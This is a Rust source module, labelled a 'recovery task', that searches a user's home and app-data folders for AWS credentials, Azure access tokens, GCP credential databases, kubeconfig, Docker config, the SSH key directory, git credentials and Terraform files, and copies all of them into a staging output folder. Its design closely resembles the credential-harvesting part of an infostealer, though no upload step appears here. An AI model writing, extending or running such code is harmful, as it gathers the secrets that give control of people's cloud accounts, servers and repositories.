use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::fs;

pub fn devops_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(DevOpsRecoveryTask::new(ctx))]
}

struct DevOpsRecoveryTask {
    specs: Vec<DevOpsSpec>,
}

struct DevOpsSpec {
    label: &'static str,
    path: PathBuf,
    is_dir: bool,
}

impl DevOpsRecoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let home = &ctx.home_dir;
        let appdata = &ctx.roaming_data_dir;
        
        let mut specs = Vec::new();

        // AWS
        specs.push(DevOpsSpec { label: "AWS Credentials", path: home.join(".aws").join("credentials"), is_dir: false });
        specs.push(DevOpsSpec { label: "AWS Config", path: home.join(".aws").join("config"), is_dir: false });

        // Azure
        specs.push(DevOpsSpec { label: "Azure Profile", path: home.join(".azure").join("azureProfile.json"), is_dir: false });
        specs.push(DevOpsSpec { label: "Azure Tokens", path: home.join(".azure").join("accessTokens.json"), is_dir: false });

        // GCP
        specs.push(DevOpsSpec { label: "GCP Credentials", path: home.join(".config").join("gcloud").join("credentials.db"), is_dir: false });

        // Kubernetes
        specs.push(DevOpsSpec { label: "Kubeconfig", path: home.join(".kube").join("config"), is_dir: false });

        // Docker
        specs.push(DevOpsSpec { label: "Docker Config", path: home.join(".docker").join("config.json"), is_dir: false });

        // SSH
        specs.push(DevOpsSpec { label: "SSH Keys", path: home.join(".ssh"), is_dir: true });

        // Git
        specs.push(DevOpsSpec { label: "Git Config", path: home.join(".gitconfig"), is_dir: false });
        specs.push(DevOpsSpec { label: "Git Credentials", path: home.join(".git-credentials"), is_dir: false });

        // Terraform
        specs.push(DevOpsSpec { label: "Terraform RC", path: home.join(".terraform.rc"), is_dir: false });
        specs.push(DevOpsSpec { label: "Terraform AppData", path: appdata.join("terraform.d"), is_dir: true });

        Self { specs }
    }
}

#[async_trait]
impl RecoveryTask for DevOpsRecoveryTask {
    fn label(&self) -> String {
        "Cloud & DevOps Credentials".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base_dest = ctx.output_dir.join("services").join("DevOps");
        fs::create_dir_all(&base_dest).await?;

        for spec in &self.specs {
            if !spec.path.exists() {
                continue;
            }

            let dest = base_dest.join(sanitize_label(spec.label));
            if spec.is_dir {
                if let Ok(meta) = fs::metadata(&spec.path).await {
                    if meta.is_dir() {
                        let _ = crate::recovery::fs::copy_dir_limited(
                            &spec.path,
                            &dest,
                            spec.label,
                            &mut artifacts,
                            1024 * 1024 * 50, // 50MB limit for DevOps files
                            0
                        ).await;
                    }
                }
            } else {
                if let Ok(meta) = fs::metadata(&spec.path).await {
                    if meta.is_file() {
                        fs::create_dir_all(&dest).await?;
                        let file_name = spec.path.file_name().unwrap_or_else(|| std::ffi::OsStr::new("file"));
                        let target_path = dest.join(file_name);
                        if let Ok(_) = fs::copy(&spec.path, &target_path).await {
                            artifacts.push(RecoveryArtifact {
                                label: spec.label.to_string(),
                                path: target_path,
                                size_bytes: meta.len(),
                                modified: meta.modified().ok(),
                            });
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}
